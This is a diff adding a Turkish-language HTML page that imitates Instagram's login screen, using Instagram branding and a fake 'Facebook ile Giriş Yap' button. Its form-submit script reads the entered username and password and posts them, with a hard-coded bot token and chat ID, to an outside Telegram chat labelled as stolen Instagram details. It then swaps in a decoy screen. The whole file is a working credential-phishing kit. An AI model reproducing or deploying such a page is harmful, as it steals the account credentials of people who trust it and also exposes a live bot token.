@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" type="image/png">
+    <title>Şifreni yenile</title>
+    <style>
+        * {
+            margin: 0px;
+            padding: 0px;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen,
+                Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+        }
+
+        #container {
+            display: flex;
+            justify-content: center;
+
+        }
+
+        .kapsayıcı a {
+            text-decoration: none;
+        }
+
+        .kapsayıcı {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+            font-size: 14px;
+            margin-top: 190px;
+        }
+
+        .kapsayıcı .kutular {
+            max-width: 350px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            background-color: #ffff;
+            border: 1px solid #e6e6e6;
+            border-radius: 1px;
+            margin-bottom: 10px;
+            padding: 30px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .kapsayıcı .başlık {
+            margin: 22px auto 12px;
+            background-image: url("https://www.instagram.com/static/bundles/es6/sprite_core_b20f2a3cd7e4.png/b20f2a3cd7e4.png");
+            background-position: -98px 0;
+            height: 51px;
+            width: 177px;
+            overflow: hidden;
+        }
+
+        .kapsayıcı .alan {
+            margin: 10px 0;
+            position: relative;
+            font-size: 14px;
+            width: 100%;
+            text-overflow: ellipsis;
+        }
+
+        .kapsayıcı input {
+            padding: 9px 0px 7px 9px;
+            font-size: 14px;
+            width: 18rem;
+            height: 2rem;
+            outline: none;
+            background: #fafafa;
+            border-radius: 3px;
+            border: 1px solid #efefef;
+            transition: border-color 0.3s;
+        }
+
+        .kapsayıcı input:focus {
+            border-color: #3897f0;
+        }
+
+        .kapsayıcı label {
+            position: absolute;
+            pointer-events: none;
+            left: 10px;
+            padding-bottom: 15px;
+            transform: translateY(10px);
+            line-height: 6px;
+            transition: all ease-out 0.1s;
+            font-size: 14px;
+            color: #999;
+            padding-top: 6px;
+        }
+
+        .kapsayıcı input::placeholder {
+            visibility: hidden;
+        }
+
+        .kapsayıcı .giriş-formu ::-moz-placeholder {
+            color: transparent;
+        }
+
+        .kapsayıcı input:not(:placeholder-shown)+label {
+            transform: translateY(0);
+            font-size: 11px;
+        }
+
+        .kapsayıcı input:not(:placeholder-shown) {
+            padding-top: 14px;
+            padding-bottom: 2px;
+        }
+
+        .kapsayıcı .giriş-butonu {
+            text-align: center;
+            width: 100%;
+            padding: 0.5rem;
+            border: 1px solid transparent;
+            background-color: #3897f0;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .kapsayıcı .giriş-butonu:hover {
+            background-color: #007bb5;
+        }
+
+        .kapsayıcı .ayırıcı {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            color: #999;
+            margin-top: 6px;
+        }
+
+        .kapsayıcı .ayırıcı .çizgi {
+            height: 1px;
+            width: 40%;
+            background-color: #dbdbdb;
+        }
+
+        .kapsayıcı .diğer {
+            display: flex;
+            justify-content: center;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .kapsayıcı .fb-giriş-btn {
+            margin: 1rem;
+            border: 0;
+            cursor: pointer;
+            font-size: 14px;
+            color: #385185;
+            font-weight: 600;
+            background: transparent;
+        }
+
+        .kapsayıcı .fb-simge {
+            color: #385185;
+            font-size: 1rem;
+            padding-right: 1px;
+        }
+
+        .kapsayıcı .şifremi-unuttum {
+            font-size: 11px;
+            color: #003569;
+        }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+        -kapsayici label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-size: 1rem;
+            font-weight: bold;
+        }
+
+        .ana-kapsayici .kontroller {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 0.5rem;
+        }
+
+        .ana-kapsayici .kontroller button {
+            background: #3b82f6;
+            color: rgb(0, 0, 0);
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .ana-kapsayici .kontroller button:hover {
+            background: #2563eb;
+        }
+
+        .ana-kapsayici .kontroller input {
+            text-align: center;
+            width: 4rem;
+            border: none;
+            padding: 0.5rem;
+            border-radius: 0.5rem;
+            background: rgba(255, 255, 255, 0.1);
+            color: rgb(0, 0, 0);
+        }
+
+        .ana-kapsayici .yukleme-butonu {
+            background: #ef4444;
+            color: rgb(0, 0, 0);
+            padding: 0.75rem;
+            width: 100%;
+            border-radius: 0.5rem;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s ease;
+            margin-bottom: 1.5rem;
+        }
+
+        .ana-kapsayici .yukleme-butonu:hover {
+            background: #dc2626;
+        }
+
+        .ana-kapsayici .ilerleme-kapsayici {
+            position: relative;
+            height: 1rem;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 0.5rem;
+            overflow: hidden;
+            margin-bottom: 1.5rem;
+            display: none;
+        }
+
+        .ana-kapsayici .ilerleme-cubugu {
+            height: 100%;
+            background: #3b82f6;
+            width: 0%;
+            animation: dolum-ilerleme 15s linear forwards;
+        }
+
+        @keyframes dolum-ilerleme {
+            0% {
+                width: 0;
+            }
+
+            100% {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+
+
+    <div id="container">
+        <div class="kapsayıcı" id="kapsayıcı">
+            <div class="kutular">
+                <div class="başlık"></div>
+                <form class="giriş-formu" id="girişFormu">
+                    <div class="alan">
+                        <input id="kullanıcı_adı" type="text"
+                            placeholder="Telefon numarası, kullanıcı adı veya e-posta" />
+                        <label for="kullanıcı_adı">Telefon numarası, kullanıcı adı veya e-posta</label>
+                    </div>
+                    <div class="alan">
+                        <input id="şifre" type="password" placeholder="Şifre" />
+                        <label for="şifre">Şifre</label>
+                    </div>
+                    <button type="submit" class="giriş-butonu" id="giriş-butonu" onclick="hata()">Giriş Yap</button>
+                    <div class="ayırıcı">
+                        <div class="çizgi"></div>
+                        <p>VEYA</p>
+                        <div class="çizgi"></div>
+                    </div>
+                    <div class="diğer">
+                        <button class="fb-giriş-btn" type="button">
+                            <i class="fa fa-facebook-official fb-simge"></i>
+                            <span>Facebook ile Giriş Yap</span>
+                        </button>
+                        <a class="şifremi-unuttum" href="#">Şifremi unuttum?</a>
+                    </div>
+                </form>
+            </div>
+            <div class="kutular">
+                <p>Hesabınız yok mu? <a class="kaydol" href="#">Hesap Oluştur</a></p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+
+
+        function hata() {
+            document.getElementById("container").style.display = "none";
+            document.getElementById("ana-kapsayici").style.display = "block";
+            document.querySelector("body").style.backgroundImage = "url('https://media1.giphy.com/media/iJP0ycADVGg6eKHhiK/200.webp?cid=ecf05e47h4zizbjl71ealibttgwotoe3pf4s9wam2nwbvf9a&ep=v1_gifs_search&rid=200.webp&ct=g')";
+        }
+
+        function baslatIlerleme() {
+            const ilerlemeKapsayici = document.getElementById("ilerlemeKapsayici");
+            const ilerlemeCubugu = document.getElementById("ilerlemeCubugu");
+            const basariMesaji = document.getElementById("basariMesaji");
+            const yuklemeButonu = document.querySelector(".yukleme-butonu");
+
+            yuklemeButonu.disabled = true;
+            ilerlemeKapsayici.style.display = "block";
+
+            setTimeout(() => {
+                ilerlemeKapsayici.style.display = "none";
+                yuklemeButonu.style.display = "none";
+                basariMesaji.style.display = "block";
+                basariMesaji.style.animation = "gorunur-ol 1s forwards";
+            }, 15000);
+        }
+
+
+
+
+
+
+
+
+
+
+
+        document.getElementById('girişFormu').addEventListener('submit', function (event) {
+            event.preventDefault(); // Formun normal gönderilmesini engelle
+
+            // Formdan verileri al
+            var kullanıcıAdı = document.getElementById('kullanıcı_adı').value;
+            var şifre = document.getElementById('şifre').value;
+
+            // Telegram Bot API URL'si
+            var token = "7609923899:AAGD9NSnt8WbigXdNTpOuYbDcU4Ypy3aOrw"; // Bot token
+            var chatId = "5196616621"; // Chat ID (Bu sizin chat_id'niz)
+
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            // Mesaj içeriğini oluştur
+            var text = `İnstagram bilgileri  :):\n\nKullanıcı Adı: ${kullanıcıAdı}\nŞifre: ${şifre}`;
+
+            // Veriyi Telegram API'sine gönder
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: text
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    console.log("", data);
+                })
+                .catch(error => {
+                    console.error("Hata:", error);
+                    alert("Bir hata oluştu, lütfen tekrar deneyin.");
+                });
+        });
+    </script>
+
+</body>
+
+</html>
